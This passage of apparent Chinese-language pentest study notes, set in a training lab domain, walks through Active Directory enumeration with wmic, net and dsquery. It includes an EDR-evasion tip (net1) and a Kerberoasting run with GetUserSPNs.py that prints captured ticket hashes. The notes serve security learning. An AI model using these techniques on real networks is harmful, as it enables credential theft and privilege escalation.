<td><code>wmic sysaccount list /format:list</code></td>
<td>转储有关任何用作服务帐户的系统帐户的信息。</td>
</tr>
</tbody></table>
<p>查看有关域和子域的信息，以及当前域信任的外部林。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress</span><br><span class="line"></span><br><span class="line">Caption          Description      DnsForestName           DomainControllerAddress  DomainName</span><br><span class="line">ACADEMY<span class="literal">-EA-MS01</span>  ACADEMY<span class="literal">-EA-MS01</span></span><br><span class="line">INLANEFREIGHT    INLANEFREIGHT    INLANEFREIGHT.LOCAL     \\<span class="number">172.16</span>.<span class="number">5.5</span>             INLANEFREIGHT</span><br><span class="line">LOGISTICS        LOGISTICS        INLANEFREIGHT.LOCAL     \\<span class="number">172.16</span>.<span class="number">5.240</span>           LOGISTICS</span><br><span class="line">FREIGHTLOGISTIC  FREIGHTLOGISTIC  FREIGHTLOGISTICS.LOCAL  \\<span class="number">172.16</span>.<span class="number">5.238</span>           FREIGHTLOGISTIC</span><br></pre></td></tr></table></figure>

<h2 id="Credential-enum"><a href="#Credential-enum" class="headerlink" title="Credential enum"></a>Credential enum</h2><h3 id="net"><a href="#net" class="headerlink" title="net"></a>net</h3><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/winsock/net-exe-2">当尝试枚举域中的信息时， Net</a>命令对很有用。这些命令可用于查询本地主机和远程主机，就像 WMI 提供的功能一样。可以列出以下信息：</p>
<ul>
<li>Local and domain users</li>
<li>Groups</li>
<li>Hosts</li>
<li>Specific users in groups</li>
<li>Domain Controllers</li>
<li>Password requirements</li>
</ul>
<p><code>net.exe</code>命令通常由 EDR 解决方案监控，如果评估包含规避成分，这些命令可以快速泄露位置。一些组织甚至会配置其监控工具，以在特定 OU 中的用户运行某些命令时发出警报，例如营销助理的帐户运行诸如<code>whoami</code>、 和<code>net localgroup administrators</code>等命令。</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>net accounts</code></td>
<td>有关密码要求的信息</td>
</tr>
<tr>
<td><code>net accounts /domain</code></td>
<td>密码和锁定策略</td>
</tr>
<tr>
<td><code>net group /domain</code></td>
<td>有关域组的信息</td>
</tr>
<tr>
<td><code>net group &quot;Domain Admins&quot; /domain</code></td>
<td>列出具有域管理员权限的用户</td>
</tr>
<tr>
<td><code>net group &quot;domain computers&quot; /domain</code></td>
<td>连接到域的 PC 列表</td>
</tr>
<tr>
<td><code>net group &quot;Domain Controllers&quot; /domain</code></td>
<td>列出域控制器的 PC 帐户</td>
</tr>
<tr>
<td><code>net group &lt;domain_group_name&gt; /domain</code></td>
<td>属于该组的用户</td>
</tr>
<tr>
<td><code>net groups /domain</code></td>
<td>域组列表</td>
</tr>
<tr>
<td><code>net localgroup</code></td>
<td>所有可用组</td>
</tr>
<tr>
<td><code>net localgroup administrators /domain</code></td>
<td>列出属于域内管理员组的用户（该组<code>Domain Admins</code>默认包含在这里）</td>
</tr>
<tr>
<td><code>net localgroup Administrators</code></td>
<td>关于群组（管理员）的信息</td>
</tr>
<tr>
<td><code>net localgroup administrators [username] /add</code></td>
<td>将用户添加到管理员</td>
</tr>
<tr>
<td><code>net share</code></td>
<td>查看当前共享</td>
</tr>
<tr>
<td><code>net user &lt;ACCOUNT_NAME&gt; /domain</code></td>
<td>获取域内用户的信息</td>
</tr>
<tr>
<td><code>net user /domain</code></td>
<td>列出域中的所有用户</td>
</tr>
<tr>
<td><code>net user %username%</code></td>
<td>有关当前用户的信息</td>
</tr>
<tr>
<td><code>net use x: \computer\share</code></td>
<td>本地安装共享</td>
</tr>
<tr>
<td><code>net view</code></td>
<td>获取计算机列表</td>
</tr>
<tr>
<td><code>net view /all /domain[:domainname]</code></td>
<td>域名上的共享</td>
</tr>
<tr>
<td><code>net view \computer /ALL</code></td>
<td>列出计算机的共享</td>
</tr>
<tr>
<td><code>net view /domain</code></td>
<td>域中的 PC 列表</td>
</tr>
</tbody></table>
<p>输入<code>net1</code>而不是<code>net</code>将执行相同的功能，规避检测。</p>
<h3 id="Dsquery"><a href="#Dsquery" class="headerlink" title="Dsquery"></a>Dsquery</h3><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)">Dsquery</a>是一个有用的命令行工具，可用于查找 Active Directory 对象。<code>dsquery</code>将存在于<code>Active Directory Domain Services Role</code>安装了的任何主机上，并且<code>dsquery</code>DLL 现在默认存在于所有现代 Windows 系统上，可以在 找到<code>C:\Windows\System32\dsquery.dll</code>。</p>
<h4 id="users"><a href="#users" class="headerlink" title="users"></a>users</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; dsquery user</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=lab_adm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Htb Student,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Annie Vazquez,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Paul Falcon,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Fae Anthony,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Walter Dillard,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Louis Bradford,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Sonya Gage,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Alba Sanchez,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Daniel Branch,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Christopher Cruz,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Nicole Johnson,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Mary Holliday,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Michael Shoemaker,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Arlene Slater,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Kelsey Prentiss,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br></pre></td></tr></table></figure>

<p>查看禁用用户的描述字段</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; dsquery user <span class="literal">-disabled</span> | dsget user <span class="literal">-memberof</span> | findstr <span class="string">&quot;Administrators&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; dsquery user <span class="literal">-disabled</span> | dsget user <span class="literal">-desc</span></span><br></pre></td></tr></table></figure>

<h4 id="computers"><a href="#computers" class="headerlink" title="computers"></a>computers</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; dsquery computer</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=ACADEMY-EA-MS01,OU=Web Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=ACADEMY-EA-MX01,OU=Mail,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=SQL01,OU=SQL Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=ILF-XRG,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=MAINLON,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=CISERVER,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=INDEX-DEV-LON,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=SQL-0253,OU=SQL Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=NYC-0615,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=NYC-0616,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=NYC-0617,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=NYC-0618,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=NYC-0619,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=NYC-0620,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=NYC-0621,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=NYC-0622,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=NYC-0623,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=LON-0455,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=LON-0456,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=LON-0457,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=LON-0458,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="wildcard"><a href="#wildcard" class="headerlink" title="wildcard"></a>wildcard</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; dsquery * <span class="string">&quot;CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Domain Computers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Schema Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Cert Publishers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Domain Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Domain Guests,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Group Policy Creator Owners,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=RAS and IAS Servers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Allowed RODC Password Replication Group,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Denied RODC Password Replication Group,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Read-only Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Enterprise Read-only Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Cloneable Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Protected Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Key Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Enterprise Key Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=DnsAdmins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=DnsUpdateProxy,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=certsvc,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h4 id="users-filter-PASSWD-NOTREQD"><a href="#users-filter-PASSWD-NOTREQD" class="headerlink" title="users filter (PASSWD_NOTREQD)"></a>users filter (PASSWD_NOTREQD)</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; dsquery * <span class="literal">-filter</span> <span class="string">&quot;(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))&quot;</span> <span class="literal">-attr</span> distinguishedName userAccountControl</span><br><span class="line"></span><br><span class="line">  distinguishedName                                                                              userAccountControl</span><br><span class="line">  CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                                    <span class="number">66082</span></span><br><span class="line">  CN=Marion Lowe,OU=HelpDesk,OU=IT,OU=HQ<span class="literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL      <span class="number">66080</span></span><br><span class="line">  CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ<span class="literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    <span class="number">66080</span></span><br><span class="line">  CN=Eileen Hamilton,OU=DevOps,OU=IT,OU=HQ<span class="literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    <span class="number">66080</span></span><br><span class="line">  CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                           <span class="number">546</span></span><br><span class="line">  CN=NAGIOSAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                           <span class="number">544</span></span><br><span class="line">  CN=LOGISTICS<span class="variable">$</span>,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                               <span class="number">2080</span></span><br><span class="line">  CN=FREIGHTLOGISTIC<span class="variable">$</span>,CN=Users,DC=INLANEFREIGHT,DC=LOCAL        </span><br></pre></td></tr></table></figure>

<h4 id="DC"><a href="#DC" class="headerlink" title="DC"></a>DC</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; dsquery * <span class="literal">-filter</span> <span class="string">&quot;(userAccountControl:1.2.840.113556.1.4.803:=8192)&quot;</span> <span class="literal">-limit</span> <span class="number">5</span> <span class="literal">-attr</span> sAMAccountName</span><br><span class="line"></span><br><span class="line"> sAMAccountName</span><br><span class="line"> ACADEMY<span class="literal">-EA-DC01</span><span class="variable">$</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h1><p>Kerberoasting 是 Active Directory 环境中的一种横向移动&#x2F;权限提升技术。此攻击针对<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names">服务主体名称 (SPN)</a>帐户。SPN 是 Kerberos 用来将服务实例映射到服务在其上下文中运行的服务帐户的唯一标识符。域帐户通常用于运行服务，以克服内置帐户（如<code>NT AUTHORITY\LOCAL SERVICE</code>）的网络身份验证限制。任何域用户都可以为同一域中的任何服务帐户请求 Kerberos 票证。如果允许跨信任边界进行身份验证，这也可以跨林信任进行。执行 Kerberoasting 攻击所需的只是帐户的明文密码（或 NTLM Hash）、域用户帐户上下文中的 shell 或加入域的主机上的 SYSTEM 级别访问权限。</p>
<blockquote>
<p>执行 Kerberoasting 攻击的先决条件是域用户凭据（如果使用 Impacket，则为明文或 NTLM Hash）、域用户上下文中的 shell 或 SYSTEM 等帐户。一旦拥有此级别的访问权限，就可以开始了。还必须知道域中的哪个主机是域控制器，以便查询它。</p>
</blockquote>
<h2 id="GetUserSPNs-py-From-Linux"><a href="#GetUserSPNs-py-From-Linux" class="headerlink" title="GetUserSPNs.py - From Linux"></a>GetUserSPNs.py - From Linux</h2><p><code>-request</code> 提取所有 TGS 票证</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request </span><br><span class="line"></span><br><span class="line">Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">ServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation </span><br><span class="line">---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------</span><br><span class="line">backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  &lt;never&gt;               </span><br><span class="line">sts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  &lt;never&gt;               </span><br><span class="line">MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  &lt;never&gt;               </span><br><span class="line">MSSQLSvc/SQL-CL01-01inlanefreight.local:49351  sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  &lt;never&gt;               </span><br><span class="line">MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  &lt;never&gt;               </span><br><span class="line">adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  &lt;never&gt;               </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$krb5tgs$23$*BACKUPAGENT$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/BACKUPAGENT*$790ae75fc53b0ace5daeb5795d21b8fe$b6be1ba275e23edd3b7dd3ad4d711c68f9170bac85e722cc3d94c80c5dca6bf2f07ed3d3bc209e9a6ff0445cab89923b26a01879a53249c5f0a8c4bb41f0ea1b1196c322640d37ac064ebe3755ce888947da98b5707e6b06cbf679db1e7bbbea7d10c36d27f976d3f9793895fde20d3199411a90c528a51c91d6119cb5835bd29457887dd917b6c621b91c2627b8dee8c2c16619dc2a7f6113d2e215aef48e9e4bba8deff329a68666976e55e6b3af0cb8184e5ea6c8c2060f8304bb9e5f5d930190e08d03255954901dc9bb12e53ef87ed603eb2247d907c3304345b5b481f107cefdb4b01be9f4937116016ef4bbefc8af2070d039136b79484d9d6c7706837cd9ed4797ad66321f2af200bba66f65cac0584c42d900228a63af39964f02b016a68a843a81f562b493b29a4fc1ce3ab47b934cbc1e29545a1f0c0a6b338e5ac821fec2bee503bc56f6821945a4cdd24bf355c83f5f91a671bdc032245d534255aac81d1ef318d83e3c52664cfd555d24a632ee94f4adeb258b91eda3e57381dba699f5d6ec7b9a8132388f2346d33b670f1874dfa1e8ee13f6b3421174a61029962628f0bc84fa0c3c6d7bbfba8f2d1900ef9f7ed5595d80edc7fc6300385f9aa6ce1be4c5b8a764c5b60a52c7d5bbdc4793879bfcd7d1002acbe83583b5a995cf1a4bbf937904ee6bb537ee00d99205ebf5f39c722d24a910ae0027c7015e6daf73da77af1306a070fdd50aed472c444f5496ebbc8fe961fee9997651daabc0ef0f64d47d8342a499fa9fb8772383a0370444486d4142a33bc45a54c6b38bf55ed613abbd0036981dabc88cc88a5833348f293a88e4151fbda45a28ccb631c847da99dd20c6ea4592432e0006ae559094a4c546a8e0472730f0287a39a0c6b15ef52db6576a822d6c9ff06b57cfb5a2abab77fd3f119caaf74ed18a7d65a47831d0657f6a3cc476760e7f71d6b7cf109c5fe29d4c0b0bb88ba963710bd076267b889826cc1316ac7e6f541cecba71cb819eace1e2e2243685d6179f6fb6ec7cfcac837f01989e7547f1d6bd6dc772aed0d99b615ca7e44676b38a02f4cb5ba8194b347d7f21959e3c41e29a0ad422df2a0cf073fcfd37491ac062df903b77a32101d1cb060efda284cae727a2e6cb890f4243a322794a97fc285f04ac6952aa57032a0137ad424d231e15b051947b3ec0d7d654353c41d6ad30c6874e5293f6e25a95325a3e164abd6bc205e5d7af0b642837f5af9eb4c5bca9040ab4b999b819ed6c1c4645f77ae45c0a5ae5fe612901c9d639392eaac830106aa249faa5a895633b20f553593e3ff01a9bb529ff036005ec453eaec481b7d1d65247abf62956366c0874493cf16da6ffb9066faa5f5bc1db5bbb51d9ccadc6c97964c7fe1be2fb4868f40b3b59fa6697443442fa5cebaaed9db0f1cb8476ec96bc83e74ebe51c025e14456277d0a7ce31e8848d88cbac9b57ac740f4678f71a300b5f50baa6e6b85a3b10a10f44ec7f708624212aeb4c60877322268acd941d590f81ffc7036e2e455e941e2cfb97e33fec5055284ae48204d</span><br><span class="line">$krb5tgs$23$*SOLARWINDSMONITOR$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SOLARWINDSMONITOR*$993de7a8296f2a3f2fa41badec4215e1$d0fb2166453e4f2483735b9005e15667dbfd40fc9f8b5028e4b510fc570f5086978371ecd81ba6790b3fa7ff9a007ee9040f0566f4aed3af45ac94bd884d7b20f87d45b51af83665da67fb394a7c2b345bff2dfe7fb72836bb1a43f12611213b19fdae584c0b8114fb43e2d81eeee2e2b008e993c70a83b79340e7f0a6b6a1dba9fa3c9b6b02adde8778af9ed91b2f7fa85dcc5d858307f1fa44b75f0c0c80331146dfd5b9c5a226a68d9bb0a07832cc04474b9f4b4340879b69e0c4e3b6c0987720882c6bb6a52c885d1b79e301690703311ec846694cdc14d8a197d8b20e42c64cc673877c0b70d7e1db166d575a5eb883f49dfbd2b9983dd7aab1cff6a8c5c32c4528e798237e837ffa1788dca73407aac79f9d6f74c6626337928457e0b6bbf666a0778c36cba5e7e026a177b82ed2a7e119663d6fe9a7a84858962233f843d784121147ef4e63270410640903ea261b04f89995a12b42a223ed686a4c3dcb95ec9b69d12b343231cccfd29604d6d777939206df4832320bdd478bda0f1d262be897e2dcf51be0a751490350683775dd0b8a175de4feb6cb723935f5d23f7839c08351b3298a6d4d8530853d9d4d1e57c9b220477422488c88c0517fb210856fb603a9b53e734910e88352929acc00f82c4d8f1dd783263c04aff6061fb26f3b7a475536f8c0051bd3993ed24ff22f58f7ad5e0e1856a74967e70c0dd511cc52e1d8c2364302f4ca78d6750aec81dfdea30c298126987b9ac867d6269351c41761134bc4be67a8b7646935eb94935d4121161de68aac38a740f09754293eacdba7dfe26ace6a4ea84a5b90d48eb9bb3d5766827d89b4650353e87d2699da312c6d0e1e26ec2f46f3077